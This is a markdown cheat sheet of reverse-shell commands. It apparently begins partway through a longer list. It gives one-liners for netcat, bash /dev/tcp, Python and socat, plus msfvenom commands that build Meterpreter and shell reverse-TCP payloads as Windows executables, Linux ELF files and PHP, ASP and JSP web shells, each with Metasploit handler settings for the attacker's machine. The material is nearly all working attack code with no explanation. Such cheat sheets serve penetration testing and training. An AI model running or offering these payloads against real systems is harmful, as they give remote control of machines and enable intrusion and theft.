### Netcat
```
nc -e /bin/sh $IP $PORT
```

### Bash
```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Socat
```
socat tcp-connect:192.168.0.5:4444 system:/bin/sh
```

## Meterpreter

### Windows 

#### Standard meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o shell_reverse.exe

//attacker machine
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

#### Windows meterpreter non-staged payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe

//attacker machine
use exploit/multi/handler
set payload windows/shell_reverse_tcp

```

#### Windows meterpreter staged payload

```
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe

//attacker machine
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```


### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf

//attacker machine
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
```

### Meterpreter Web Payloads

#### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

#### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
```
